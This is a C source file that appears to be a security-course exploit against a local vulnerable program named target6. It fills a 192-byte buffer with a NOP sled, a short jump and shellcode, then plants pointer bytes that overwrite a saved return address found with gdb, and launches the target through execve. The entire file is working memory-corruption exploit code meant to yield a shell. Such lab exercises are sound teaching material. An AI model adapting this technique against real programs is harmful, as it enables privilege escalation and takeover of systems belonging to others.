#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
// #include <stdint.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

/*
  rbp at 0x3021fea0, rip at 0x3021fea8
  (gdb) p &arg
  $1 = (char **) 0x3021fe88
  (gdb) p &p
  $2 = (char **) 0x3021fe98
  (gdb) p &q
  $3 = (char **) 0x3021fe90
*/

int main(void)
{
  char *args[3];
  char *env[1];

  // uint32_t input[33];
  // memset(input, 0x90, sizeof(input));
  // memcpy(input + 2, shellcode, sizeof(shellcode) - 1);

  // input[0] =  0x010106eb; /* eb 06: jmp 8 */
  // input[1] =  0x01010101;

  // input[18] = 0x0104ec48; /* q left  - shellcode */
  // input[19] = 0x3021fea8; /* q right - saved rip */

  // Start
  char buf[192];

  // Fill up the buffer with NOP
  for (int i = 0; i < 192; i++) {
      buf[i] = '\x90';
  }

  buf[0] = '\xeb';
  buf[1] = '\x05'; // This should be the jump distance
  buf[2] = '\x01';
  buf[3] = '\x01';
  buf[4] = '\x01';
  buf[5] = '\x01';
  buf[6] = '\x01';

  for(int i = 0; i < strlen(shellcode); i++){
		buf[7 + i] = shellcode[i];
	}

  buf[72] = '\x48';
  buf[73] = '\xec';
  buf[74] = '\x04';
  buf[75] = '\x01';

  buf[76] = '\xa8';
  buf[77] = '\xfe';
  buf[78] = '\x21';
  buf[79] = '\x30';

  buf[191] = '\x00';

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
